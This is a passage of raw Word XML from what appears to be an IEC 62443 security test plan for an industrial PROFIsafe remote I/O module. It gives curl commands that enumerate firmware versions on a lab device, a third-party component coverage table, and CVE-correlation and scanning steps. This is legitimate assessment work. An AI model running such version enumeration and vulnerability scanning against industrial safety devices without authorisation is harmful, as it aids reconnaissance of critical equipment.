        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>deviceinfo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>swinfo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>scpubootloaderversion</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> &lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="456BF1FC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firmware/version firmware/type &lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="592F32C7" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="00015538" w:rsidRDefault="005B4077" w:rsidP="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>fieldbussetup</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>fieldbusfirmware</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> ; do</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02BBDB28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echo "== $ep =="; curl -s "</w:t>
      </w:r>
      <w:hyperlink r:id="rId147" w:history="1">
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>http://192.168.0.2/$ep</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BD33F5B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done | tee TC0601_swinv.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72327E3E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# I&amp;M0 SOFTWARE_REVISION + I&amp;M5 annotation via acyclic PN read -&gt; append to inventory</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16220EEE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 xml:space="preserve">| </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Expected</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | Host FW, CPU bootloader, SCPU FW, SCPU bootloader, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>PROFIsafe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> stack ("3.3.0.12"), I&amp;M0/I&amp;M5 all returned and mutually consistent. | | </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Result</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | ☐ All safety-relevant SW identified ☐ Consistency (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>deviceinfo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> ↔ I&amp;M) confirmed | | </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Evidence</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | TC0601_swinv.txt, I&amp;M0/I&amp;M5 read log, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>inventory→safety-function</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> mapping table | </w:t>
      </w:r>
      <w:hyperlink r:id="rId148" w:history="1">
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="33A3846C" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="005B4077">
        <w:pict w14:anchorId="4EE746E8">
          <v:rect id="_x0000_i1419" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="231BF369" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="00015538" w:rsidRDefault="005B4077" w:rsidP="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TC-RQ006-02 — SBOM Completeness &amp; Third-Party CVE-Correlation Gap (G-1 proof — decisive)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0255C443" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005B4077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7753"/>
      </w:tblGrid>
      <w:tr w:rsidR="005B4077" w:rsidRPr="005B4077" w14:paraId="29D420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56EBE6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A49AD1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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005B4077" w:rsidRPr="005B4077" w14:paraId="1472D8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3F4F6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9579C" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="005B4077">
              <w:t>TC-RQ006-02</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005B4077" w:rsidRPr="005B4077" w14:paraId="05A1B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A6FBD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D61E8" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve">RQ-006 → CR 7.8 (SBOM </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>limb</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>) / 4-1 SM-9-SM-10 → Asset D</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005B4077" w:rsidRPr="005B4077" w14:paraId="1D699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9C590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CF901" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="005B4077">
              <w:t>Information Disclosure (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>incomplete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inventory</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve"> → </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>un-managed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vulnerability</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005B4077" w:rsidRPr="005B4077" w14:paraId="39E45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3C275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 xml:space="preserve">SVV </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:lastRenderedPageBreak/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7FEBD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lastRenderedPageBreak/>
              <w:t>SVV-3</w:t>
            </w:r>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>Vulnerability</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>Testing</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005B4077" w:rsidRPr="00015538" w14:paraId="4D016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B2187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1EA2D" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="00015538" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">Demonstrate that the exposed inventory is </w:t>
            </w:r>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>top-level only</w:t>
            </w:r>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> and provides no </w:t>
            </w:r>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>SBOM</w:t>
            </w:r>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> of the safety-critical third-party components (RTOS, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>PROFIsafe</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> stack, STM self-test library, netX90 stack), so their versions cannot be enumerated or CVE-correlated — CR 7.8 met at product granularity but not at component granularity.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005B4077" w:rsidRPr="00015538" w14:paraId="296B6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F3745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 xml:space="preserve">Abstract </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077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8308E" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="00015538" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>1. From TC-RQ006-01, list all device-exposed version strings. 2. From documentation, list the known constituent third-party components. 3. Attempt to derive each component's version from any exposed interface. 4. For derivable versions, query a vulnerability database (off-lab); record the rest as un-inventoried.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005B4077" w:rsidRPr="00015538" w14:paraId="65012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EF342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6DAB5" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="00015538" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Expected = FAIL:</w:t>
            </w:r>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> third-party components are not individually exposed and no SBOM exists → confirms </w:t>
            </w:r>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>G-1</w:t>
            </w:r>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>; documented as a CR 7.8 completeness shortfall requiring an SBOM (BSI TR-03183 / ISVS V1.1.1).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="77402B6A" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005B4077">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Level 2 — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005B4077">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Concrete</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005B4077">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005B4077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5B4077" w:rsidRPr="005B4077" w14:paraId="24F9C4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CE89BA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86871A" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005B4077">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005B4077" w:rsidRPr="005B4077" w14:paraId="6DCBA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32D81" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Ref</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B407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F57D11" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="005B4077">
              <w:t>TC-RQ006-02</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005B4077" w:rsidRPr="00015538" w14:paraId="62ACEE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940BB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50566" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="00015538" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">DUT 192.168.0.2; Pi </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>mgmt</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> eth1 = 192.168.50.10; CVE lookup performed </w:t>
            </w:r>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>off-lab</w:t>
            </w:r>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (no </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>lab↔Internet</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> coupling)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005B4077" w:rsidRPr="00015538" w14:paraId="25E3C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813D3" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="005B4077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D4318" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="00015538" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>curl (inventory); manual coverage table; NVD lookup off-lab; optional GVM/OpenVAS (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>ifm</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> CM-008) on the HTTP surface only</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2E67C83E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# TC-RQ006-02 SBOM-completeness assessment (device side = read-only enumeration)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E79CC36" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="00015538" w:rsidRDefault="005B4077" w:rsidP="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>curl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId149" w:history="1">
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="pt-BR"/>
          </w:rPr>
          <w:t>http://192.168.0.2/fieldbussetup/fieldbusfirmware</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC0602_stack.json # </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>PROFIsafe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>stack</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> ver</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="019C1DB8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# Coverage table: exposed-version vs known constituent (NOT exposed by device):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D2CD71C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 xml:space="preserve"># </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>uC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/OS-II (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Micrium</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>) [SRIO-1260] -&gt; NOT exposed</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C454104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 xml:space="preserve"># </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>PROFIsafe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> stack (SIL3) [SRIO-1929] -&gt; partially via </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>fieldbusfirmware</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="27DBEE5A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# STM32F7 Self-Test Library [SRIO-10766] -&gt; NOT exposed</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B53B981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# netX90 PROFINET stack [SRIO-1768] -&gt; NOT exposed</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1600564B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# derivable versions -&gt; off-lab NVD query; rest -&gt; "un-inventoried"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25FB3937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 xml:space="preserve">| </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Expected</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | Only the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>PROFIsafe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> stack version partially derivable; RTOS/STL/netX90 versions </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>not exposed</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> → no SBOM, no third-party CVE correlation. | | </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Result</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | ☐ SBOM absent (G-1 confirmed) — un-inventoried: ______ | | </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Evidence</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | TC0602_stack.json, exposed-vs-constituent coverage table, off-lab NVD notes | </w:t>
      </w:r>
      <w:hyperlink r:id="rId150" w:history="1">
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId151" w:history="1">
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>ifmworld</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
